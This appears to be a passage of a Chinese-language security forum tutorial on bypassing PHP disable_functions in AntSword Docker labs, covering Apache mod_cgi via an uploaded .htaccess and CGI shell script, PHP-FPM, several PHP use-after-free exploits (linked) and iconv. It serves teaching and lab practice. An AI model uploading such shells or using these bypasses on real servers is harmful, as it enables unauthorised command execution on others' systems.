[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c2f1edefe0d400352c9528def9e7aefbb047dd82.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c2f1edefe0d400352c9528def9e7aefbb047dd82.png)

验证poc,在容器外执行`docker exec i_imagemagick_1 convert /poc.png 1.png`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-54c3d439cbd70a8c4d1d0d9de071ca1a32eb9e9c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-54c3d439cbd70a8c4d1d0d9de071ca1a32eb9e9c.png)

利用 Apache Mod CGI
-----------------

利用条件:

- Apache + PHP (apache 使用 apache\_mod\_php)
- Apache 开启了 cgi, rewrite
- Web 目录给了 AllowOverride 权限

### 关于mod\_cgi是什么

[http://httpd.apache.org/docs/current/mod/mod\_cgi.html](http://httpd.apache.org/docs/current/mod/mod_cgi.html)  
任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中。  
当Apache 开启了cgi, rewrite时，我们可以利用.htaccess文件，临时允许一个目录可以执行cgi程序并且使得服务器将自定义的后缀解析为cgi程序，则可以在目的目录下使用.htaccess文件进行配置。

### 如何利用

由于环境搭建困难,使用蚁剑的[docker](https://github.com/AntSwordProject/AntSword-Labs)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4d4822e3195b6537661e5b0ee0d72f8acbcf8eda.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4d4822e3195b6537661e5b0ee0d72f8acbcf8eda.png)

在web目录下上传`.htaccess`文件

```php
Options +ExecCGI
AddHandler cgi-script .ant
```

上传shell.ant

```php
#!/bin/sh
echo Content-type: text/html
echo ""
echo&amp;&amp;id
```

由于目标是liunx系统,linux中CGI比较严格。这里也需要去liunx系统创建文件上传,如果使用windows创建文件并上传是无法解析的。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b40ee0da5f141f1a1b9d2ac3e75a89add3a20d40.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b40ee0da5f141f1a1b9d2ac3e75a89add3a20d40.png)

直接访问shell.xxx ,这里报错,是因为没有权限访问  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-99f151f76c37e8694b785ef7eaa54ffd1df940b0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-99f151f76c37e8694b785ef7eaa54ffd1df940b0.png)

直接使用蚁剑修改权限  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-02a09bffa334deb369dbf68dfa737ba9b0d662e1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-02a09bffa334deb369dbf68dfa737ba9b0d662e1.png)

复现成功  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b0dc1f41281c1e7a3306c6e22d2b60b8adbd75d8.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b0dc1f41281c1e7a3306c6e22d2b60b8adbd75d8.png)

利用攻击PHP-FPM
-----------

利用条件

- Linux 操作系统
- PHP-FPM
- 存在可写的目录, 需要上传 .so 文件

关于什么是PHP-FPM,这个可以看<https://www.php.cn/php-weizijiaocheng-455614.html>  
关于如何攻击PHP-FPM,请看这篇[浅析php-fpm的攻击方式](https://xz.aliyun.com/t/5598)

蚁剑环境

```php
git clone https://github.com/AntSwordProject/AntSword-Labs.git
cd AntSword-Labs/bypass_disable_functions/5
docker-compose up -d
```

连接shell后无法执行命令  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5d91306167bdffb31af4e486adb791421b757b2a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5d91306167bdffb31af4e486adb791421b757b2a.png)

查看phpinfo,发现目标主机配置了`FPM/Fastcgi`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-866ddfd03b69c280da6bc3ba46ea21fe87aff7d3.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-866ddfd03b69c280da6bc3ba46ea21fe87aff7d3.png)

使用插件  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d06e2eec8900aaa8df5c8c53b83beaff34c568c0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d06e2eec8900aaa8df5c8c53b83beaff34c568c0.png)

要注意该模式下需要选择 PHP-FPM 的接口地址，需要自行找配置文件查 FPM 接口地址，本例中PHP-FPM 的接口地址，发现是 127.0.0.1:9000,所以这里改为127.0.0.1：9000  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b00fad385acd5cb8c82b46f0e772b98563743546.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b00fad385acd5cb8c82b46f0e772b98563743546.png)

但是这里我死活利用不了  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-be4cde9b9ffac0470199d2c08a89c92af3c83990.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-be4cde9b9ffac0470199d2c08a89c92af3c83990.png)

这里换了几个版本还是不行，但看网上师傅利用是没问题的  
有感兴趣想复现师傅看这里:[https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass\_disable\_functions/5](https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5)

利用 GC UAF
---------

利用条件

- Linux 操作系统
- PHP7.0 - all versions to date
- PHP7.1 - all versions to date
- PHP7.2 - all versions to date
- PHP7.3 - all versions to date

[EXP](https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php)  
[关于原理](http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/04/19/PHP%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0(1st)/)  
通过PHP垃圾收集器中堆溢出来绕过 disable\_functions 并执行系统命令。

搭建环境

```php
cd AntSword-Labs/bypass_disable_functions/6
docker-compose up -d
```

受到disable\_function无法执行命令  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-56b268d87d389545d87e07b334990f095461fab8.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-56b268d87d389545d87e07b334990f095461fab8.png)

使用插件成功执行后弹出一个新的虚拟终端，成功bypass  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8c77fbd3826e30bfb26dadbf18faadd2740356e9.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8c77fbd3826e30bfb26dadbf18faadd2740356e9.png)

利用 Json Serializer UAF
----------------------

利用条件

- Linux 操作系统
- PHP7.1 - all versions to date
- PHP7.2 &lt; 7.2.19 (released: 30 May 2019)
- PHP7.3 &lt; 7.3.6 (released: 30 May 2019)

[利用漏洞](https://bugs.php.net/bug.php?id=77843)  
[POC](https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php)

上传POC到`/var/tmp`目录下  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5e2d6bbc92ba915c1b1833fa12c10587da9450e4.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5e2d6bbc92ba915c1b1833fa12c10587da9450e4.png)

包含bypass文件

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-52a636f96f5d98c962c7c14b2aaf4d6fc00b3be5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-52a636f96f5d98c962c7c14b2aaf4d6fc00b3be5.png)

也可以稍作修改

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ed02a3b6a0d8e5fbbccb3958402308a5448965a4.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ed02a3b6a0d8e5fbbccb3958402308a5448965a4.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b2ec8d479cb1c5885a7da8d93d02740d01f5ddcd.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b2ec8d479cb1c5885a7da8d93d02740d01f5ddcd.png)

当然使用插件是最简单的

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b67e72020b030e27b27135ee584b070173c943b7.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b67e72020b030e27b27135ee584b070173c943b7.png)

利用Backtrace UAF
---------------

利用条件

- Linux 操作系统
- PHP7.0 - all versions to date
- PHP7.1 - all versions to date
- PHP7.2 - all versions to date
- PHP7.3 &lt; 7.3.15 (released 20 Feb 2020)
- PHP7.4 &lt; 7.4.3 (released 20 Feb 2020)

[利用漏洞](https://bugs.php.net/bug.php?id=76047)  
[EXP](https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass)

利用iconv
-------

利用条件

- Linux 操作系统
- `putenv`
- `iconv`
- 存在可写的目录, 需要上传 `.so` 文件

利用原理分析<https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/>

利用复现:  
获得镜像

```php
git clone https://github.com/AntSwordProject/AntSword-Labs.git
cd AntSword-Labs/bypass_disable_functions/9
docker-compose up -d
```

无法执行命令  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-531467755d4d5f52b3c31c2f4f0381a6e6ab8655.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-531467755d4d5f52b3c31c2f4f0381a6e6ab8655.png)

使用iconv插件bypass  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-21de8dd1e25132742249336e8202f826d04083df.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-21de8dd1e25132742249336e8202f826d04083df.png)

创建副本后,将url改为`/.antproxy.php`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-049011e801130b8b86d88abab6d819e5194a1aee.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-049011e801130b8b86d88abab6d819e5194a1aee.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0c5400047ff77da73d61d75d87b1043baba05ede.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0c5400047ff77da73d61d75d87b1043baba05ede.png)

Reference
=========

[浅谈几种Bypass open\_basedir的方法](https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/)  
[PHP bypass open\_basedir](http://diego.team/2020/07/28/PHP-bypass-open_basedir/)  
[php5全版本绕过open\_basedir读文件脚本](https://www.leavesongs.com/bypass-open-basedir-readfile.html)  
<https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/#Bypass-3>  
[https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Bypass%20Disable\_functions/](https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Bypass%20Disable_functions/)  
[https://clq0.top/bypass-disable\_function-php/#iconv](https://clq0.top/bypass-disable_function-php/#iconv)  
<https://github.com/AntSwordProject/AntSword-Labs>  
<https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html>